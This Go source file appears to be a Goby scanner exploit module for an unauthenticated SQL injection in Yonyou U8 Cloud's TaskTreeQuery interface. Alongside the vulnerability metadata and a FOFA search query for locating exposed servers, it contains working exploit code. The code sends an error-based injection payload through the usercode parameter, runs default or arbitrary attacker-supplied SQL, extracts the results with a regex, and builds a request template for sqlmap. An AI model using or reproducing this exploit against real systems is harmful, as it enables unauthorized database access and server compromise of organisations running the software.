package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "yonyou-U8-Cloud /nc.itf.iufo.mobilereport.task.TaskTreeQuery SQL Injection Vulnerability",
    "Description": "<p>Yonyou U8 Cloud is a new generation of cloud ERP launched by Yonyou, which mainly focuses on growing and innovative enterprises and provides enterprise-level cloud ERP overall solutions. </p><p>There is an SQL injection vulnerability in the nc.itf.iufo.mobilereport.task.TaskTreeQuery interface of yonyou U8 Cloud, through which an unauthorized attacker can obtain database privileges, and further exploit can lead to server compromise.</p>",
    "Product": "yonyou-U8-Cloud",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2023-12-04",
    "PostTime": "2024-07-31",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"U8C\" && body=\"U8 cloud\"",
    "GobyQuery": "title=\"U8C\" && body=\"U8 cloud\"",
    "Level": "1",
    "Impact": "<p>An unauthorized attacker can gain database privileges through this vulnerability, and further exploit could lead to server compromise.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/134794199"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select \"6666\"",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "用友-U8-Cloud /nc.itf.iufo.mobilereport.task.TaskTreeQuery SQL 注入漏洞",
            "Product": "用友-U8-Cloud",
            "Description": "<p>用友U8 Cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。<br></p><p>用友U8 Cloud nc.itf.iufo.mobilereport.task.TaskTreeQuery接口处存在SQL注入漏洞，未授权的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>未授权的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "yonyou-U8-Cloud /nc.itf.iufo.mobilereport.task.TaskTreeQuery SQL Injection Vulnerability",
            "Product": "yonyou-U8-Cloud",
            "Description": "<p>Yonyou U8 Cloud is a new generation of cloud ERP launched by Yonyou, which mainly focuses on growing and innovative enterprises and provides enterprise-level cloud ERP overall solutions.&nbsp;</p><p>There is an SQL injection vulnerability in the nc.itf.iufo.mobilereport.task.TaskTreeQuery interface of yonyou U8 Cloud, through which an unauthorized attacker can obtain database privileges, and further exploit can lead to server compromise.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>An unauthorized attacker can gain database privileges through this vulnerability, and further exploit could lead to server compromise.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10984"
}`
	setSqlPayloadHashcadjcqeh9fb2hfb233fbhuy2duyg3 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		vulurl = "/service/~iufo/nc.itf.iufo.mobilereport.task.TaskTreeQuery?usercode="
		payload :="1' and 1=convert(int,("+sql+"))--"
		vulurl += url.QueryEscape(payload)
		makeRequest := httpclient.NewGetRequestConfig(vulurl)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 5
		makeRequest.FollowRedirect = false
		resp, err = httpclient.DoHttpRequest(hostInfo, makeRequest)
		if err != nil || resp.StatusCode != 200 {
			return resp, vulurl, err
		}
		return resp, vulurl, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "SQL Server"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "select @@version"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `\\u0027([\s\S]*?)\\u0027`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashcadjcqeh9fb2hfb233fbhuy2duyg3
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /service/~iufo/nc.itf.iufo.mobilereport.task.TaskTreeQuery?usercode=1%27*  HTTP/1.1\r\nHost: "+expResult.HostInfo.HostInfo+"\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip"

			// 3.配置正则语句，从响应包中提取出数据
			regular := `\\u0027([\s\S]*?)\\u0027`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashcadjcqeh9fb2hfb233fbhuy2duyg3
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql:= ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				}else{
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "SELECT DB_NAME()"
					}else if way == "db_version" {
						sql = "SELECT @@version"
					}else if way == "user_name" {
						sql = "SELECT user"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			}else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
